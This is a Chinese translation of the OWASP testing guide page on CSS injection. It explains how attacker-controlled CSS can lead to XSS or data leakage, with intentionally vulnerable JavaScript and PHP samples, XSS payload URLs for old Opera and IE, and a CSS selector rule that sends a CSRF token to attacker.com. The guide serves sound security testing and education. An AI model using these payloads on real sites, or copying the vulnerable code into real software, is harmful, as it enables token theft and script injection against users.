# 测试CSS注入

## 概述

CSS注入漏洞涉及攻击者能够在受信任网站上下文中注入任意CSS代码，并在受害者浏览器中呈现的能力。此类漏洞的影响因所提供CSS有效负载而异，可能导致跨站脚本攻击或数据泄露。

当应用程序允许用户提供的CSS干扰应用程序的合法样式表时，就会出现此漏洞。在CSS上下文中注入代码可能使攻击者能够在特定条件下执行JavaScript，或利用能够生成HTTP请求的CSS选择器和函数提取敏感值。通常，允许用户通过提供自定义CSS文件来定制页面存在显著风险。

以下JavaScript代码展示了一个可能存在漏洞的脚本，攻击者能够控制到达`cssText`函数（接收器）的`location.hash`（源）。这种特定情况可能导致旧版浏览器中出现基于DOM的XSS攻击；更多信息请参阅[基于DOM的XSS防御检查单](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)。

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

攻击者可通过诱导受害者访问以下URL实施攻击：

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

同类漏洞也可能出现在反射型XSS场景中，例如以下PHP代码示例：

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

进一步的攻击场景涉及通过纯CSS规则实现数据提取。此类攻击可通过CSS选择器实施，导致数据泄露（如CSRF令牌窃取）。

以下了攻击向量示例展示选择`name`属性为`csrf_token`且`value`以字母`a`开头的输入框。通过暴力破解属性值，攻击者可实施将数据外传到攻击者域名的攻击（例如通过为被选中的输入元素设置背景图，当值匹配时连接到攻击者控制的域名，此处当csrf令牌以`a`开头时，攻击者域名得到`log?a`路径的请求）。

```css
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
```

其他利用CSS等诱导内容的攻击案例可参考[Mario Heiderich在YouTube上的演讲《Got Your Nose》](https://www.youtube.com/watch?v=FIQvAaZj_HA)。

## 测试目标

- 识别CSS注入点
- 评估注入影响

## 测试方法

应通过代码分析确认是否允许用户在CSS上下文中注入内容，重点检查网站根据输入返回CSS规则的方式。

以下为基础示例：

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

上述代码存在可由攻击者控制的源（`location.hash`），可直接注入HTML元素的`style`属性。如前所述，根据所用浏览器和有效负载的不同，可能导致不同结果。

以下页面提供CSS注入漏洞案例：
- [基于CSS和HTML5的密码"破解器"](https://html5sec.org/invalid/?length=25)
- [使用未转义输入的`CSSStyleDeclaration`发起JavaScript攻击](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

有关CSS注入防护的更多OWASP资源，请参阅[安全层叠样式表防护指南](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html)。

## 引用

- [WSTG-CLNT-05](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md)